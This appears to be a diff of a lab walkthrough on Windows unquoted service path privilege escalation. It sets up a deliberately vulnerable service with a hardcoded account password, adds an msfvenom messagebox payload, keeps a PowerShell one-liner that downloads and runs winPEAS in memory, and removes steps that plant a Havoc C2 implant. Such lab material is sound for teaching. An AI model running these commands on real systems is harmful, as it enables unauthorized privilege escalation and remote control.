@@ -31,7 +31,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
 
 ```powershell
 sc create VulnService binPath= "C:\MyPrograms\Vulnerable Service\VulnService.exe"
-sc config VulnService obj= ".\Threatadmin" password= "password"
+sc config VulnService obj= ".\Threatadmin" password= "Threathunt25"
 sc qc VulnService
 sc start VulnService
 ```
@@ -45,6 +45,12 @@ It will parse "C:\MyPrograms\Vulnerable Service\service.exe" into
 
 By placing a malicious service exe in "C:\MyPrograms\" named `vulnerable.exe`, we'll escalate privileges to NT SYSTEM AUHTORITY (if the service is running with those privileges)
 
+# Generate a simple MSFVenom service payload that pops a text box
+
+On Kali:
+
+```bash
+msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Successful Execution :)" TITLE="CrimsonCORE" -f svc -o msg.exe
 
 
 Then drop metasploit payload (renamed to Vulnerable.exe) in C:\MyPrograms.
@@ -60,21 +66,12 @@ Run the following tools as a regular unprivileged user (`runas /user:student pow
 
 ### WINPEAS
 
-Runas student (unprivileged)
-
 ```powershell
 powershell "IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')"
 ```
 
 
 
-Use the Havoc session to upload a havoc.exe renamed to `vulnerable.exe` to the `C:\MyPrograms\Vulnerable Service\` path, and then start the VulnService, using the havoc `shell` command.
-
-upload /opt/havoc/demonsvc.x64.exe c:\MyPrograms\Vulnerable.exe
-
-```powershell
-sc.exe start VulnService
-```
 
 > Please note that regular users can't restart services, but after a reboot this will automatically execute.
 
